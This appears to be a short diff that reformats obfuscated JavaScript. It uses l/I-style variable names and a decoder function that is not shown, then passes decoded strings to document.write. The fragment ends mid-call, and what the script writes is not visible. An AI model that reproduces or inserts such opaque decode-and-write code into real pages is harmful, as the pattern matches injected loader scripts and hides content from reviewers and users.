@@ -1,11 +1,10 @@
 var lllIIllI = /%20|%0D|%0A/gi;
+
 var lIIIIIIl = parseInt(lIIIIllI("IIllIIII"));
 var lIIIIIlI = parseInt(lIIIIllI("IIllIIIl"));
 var lIIIIIll = parseInt(lIIIIllI("IIllIIIlIIllIllI"));
-var lIIIIlII =
-    parseInt(lIIIIllI("IIllIIllIIllIIlI"));
-var lIIIIlIl = parseInt(lIIIIllI("IIllIIIlIIllIIIIIIllIIIIII" +
-    "llIIIIIIllIIII"));
+var lIIIIlII = parseInt(lIIIIllI("IIllIIllIIllIIlI"));
+var lIIIIlIl = parseInt(lIIIIllI("IIllIIIlIIllIIIIIIllIIIIII" + "llIIIIIIllIIII"));
 var lIIIIIII = document;
 lIIIIIII.write(lIIIIllI("IIllllIIIlIIlIIIIlIlIlIIIlIIllI" +
     "lIlIIllIIIIlllllIIIllllIIIlIIlIIIIlIIIlIlIlIIIIIlIlIIIlIIIIlllllIIIllllIIIlIlIIllIlIIIIllIlIlIIl" +
